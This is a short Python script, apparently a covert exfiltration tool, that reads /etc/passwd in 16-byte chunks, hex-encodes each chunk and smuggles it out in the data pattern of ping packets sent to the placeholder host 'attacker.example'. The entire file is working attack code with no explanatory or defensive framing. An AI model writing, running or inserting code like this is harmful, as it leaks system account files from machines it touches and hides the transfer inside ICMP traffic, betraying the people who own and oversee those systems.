import subprocess

TARGET = 'attacker.example'

def chunks(path, size=16):
    with open(path, 'rb') as handle:
        while True:
            block = handle.read(size)
            if not block:
                break
            yield block

def send_chunk(block):
    payload = block.hex()
    return subprocess.run(['ping', '-c', '1', '-p', payload, TARGET], capture_output=True)

def main():
    for block in chunks('/etc/passwd'):
        send_chunk(block)

